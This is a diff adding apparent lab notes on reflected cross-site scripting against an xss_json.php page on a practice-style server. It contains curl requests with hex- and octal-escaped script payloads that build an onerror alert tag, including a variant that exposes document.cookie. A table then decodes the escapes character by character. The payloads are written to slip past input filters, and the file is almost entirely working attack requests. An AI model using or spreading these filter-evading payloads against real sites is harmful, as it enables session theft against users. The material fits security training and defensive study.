@@ -1,0 +1,86 @@
+1. curl -i -s -k  -X $'GET' \
+    -H $'Host: 159.65.220.42' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:70.0) Gecko/20100101 Firefox/70.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://159.65.220.42/xss_json.php' -H $'Cookie: PHPSESSID=fm8clp9kv3h8kfofsl9qt3uho4; security_level=1' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=fm8clp9kv3h8kfofsl9qt3uho4; security_level=1' \
+    $'http://159.65.220.42/xss_json.php?title=%3cscript%3edocument%2ewrite(\'%5cx3C%5cx69%5cx6D%5cx67%5cx20%5cx73%5cx72%5cx63%5cx3D%5cx31%5cx20%5cx6F%5cx6E%5cx65%5cx72%5cx72%5cx6F%5cx72%5cx3D%5cx61%5cx6C%5cx65%5cx72%5cx74%5cx28%5cx31%5cx29%5cx3E\')%3b%3c%2fscript%3e&action=pokoyo2'
+
+
+2. curl -i -s -k  -X $'GET' \
+    -H $'Host: 159.65.220.42' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:70.0) Gecko/20100101 Firefox/70.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://159.65.220.42/xss_json.php?title=%3cscript%3edocument%2ewrite(\\%27%5cx3C%5cx69%5cx6D%5cx67%5cx20%5cx73%5cx72%5cx63%5cx3D%5cx31%5cx20%5cx6F%5cx6E%5cx65%5cx72%5cx72%5cx6F%5cx72%5cx3D%5cx61%5cx6C%5cx65%5cx72%5cx74%5cx28document.cookie%5cx29%5cx3E\\%27)%3b%3c%2fscript%3e&action=pokoyo2' -H $'Cookie: PHPSESSID=fm8clp9kv3h8kfofsl9qt3uho4; security_level=1' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=fm8clp9kv3h8kfofsl9qt3uho4; security_level=1' \
+    $'http://159.65.220.42/xss_json.php?title=%3cscript%3edocument%2ewrite(\'%5c074%5c151%5c155%5c147%5c040%5c163%5c162%5c143%5c075%5c061%5c040%5c157%5c156%5c145%5c162%5c162%5c157%5c162%5c075%5c141%5c154%5c145%5c162%5c164%5c050%5c061%5c051%5c076\')%3b%3c%2fscript%3e&action=search'
+
+
+
+
+LINK :: http://159.65.220.42/xss_json.php?title=%3cscript%3edocument%2ewrite(\'%5cx3C%5cx69%5cx6D%5cx67%5cx20%5cx73%5cx72%5cx63%5cx3D%5cx31%5cx20%5cx6F%5cx6E%5cx65%5cx72%5cx72%5cx6F%5cx72%5cx3D%5cx61%5cx6C%5cx65%5cx72%5cx74%5cx28document.cookie%5cx29%5cx3E\')%3b%3c%2fscript%3e&action=pokoyo2
+
+REQUEST :: /xss_json.php?title=%3cscript%3edocument%2ewrite('%5cx3C%5cx69%5cx6D%5cx67%5cx20%5cx73%5cx72%5cx63%5cx3D%5cx31%5cx20%5cx6F%5cx6E%5cx65%5cx72%5cx72%5cx6F%5cx72%5cx3D%5cx61%5cx6C%5cx65%5cx72%5cx74%5cx28%5cx31%5cx29%5cx3E')%3b%3c%2fscript%3e&action=search HTTP/1.1
+
+PAYLOAD :: \'%5cx3C%5cx69%5cx6D%5cx67%5cx20%5cx73%5cx72%5cx63%5cx3D%5cx31%5cx20%5cx6F%5cx6E%5cx65%5cx72%5cx72%5cx6F%5cx72%5cx3D%5cx61%5cx6C%5cx65%5cx72%5cx74%5cx28%5cx31%5cx29%5cx3E\'
+
+
+==========
+  TABLE 
+==========
+
+\'
+%5cx
+3C
+%5cx
+69
+%5cx
+6D
+%5cx
+67
+%5cx
+20                  ->SPACE
+%5cx
+73                  ->s
+%5cx
+72                  ->r
+%5cx
+63                  ->c
+%5cx
+3D                  ->=
+%5cx
+31                  ->1
+%5cx
+20                  ->SPACE   
+%5cx
+6F                  ->o
+%5cx
+6E                  ->n
+%5cx
+65                  ->e
+%5cx
+72                  ->r 
+%5cx
+72                  ->r 
+%5cx
+6F                  ->o
+%5cx
+72                  ->r      
+%5cx
+3D                  ->=
+%5cx
+61                  ->a
+%5cx
+6C                  ->l
+%5cx
+65                  ->e
+%5cx
+72                  ->r
+%5cx
+74                  ->t
+%5cx
+28                  ->(
+%5cx
+31                  ->1
+%5cx
+29                  ->)
+%5cx
+3E\                 -> >
+=================================================
+
+
+SOURCE :: https://krypted.com/utilities/html-encoding-reference/
